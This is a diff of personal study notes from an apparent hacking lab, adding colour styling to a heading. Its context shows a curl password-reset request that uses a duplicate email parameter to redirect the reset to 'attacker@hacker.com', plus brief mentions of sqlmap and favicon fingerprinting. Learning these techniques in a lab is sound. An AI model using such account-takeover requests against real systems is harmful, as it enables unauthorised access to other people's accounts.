@@ -30,7 +30,7 @@ sqlmap: tool used for sql injection
  (https://wiki.owasp.org/index.php/OWASP_favicon_database) and then exploit it.
  (also using curl url and adding -v shows http header details)
  
-   Authentication bypass example:
+   <span style="color:rgb(243, 88, 88)">Authentication bypass</span> example:
    `curl 'http://10.112.134.214/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`
     (-H adds content to the http header)
 
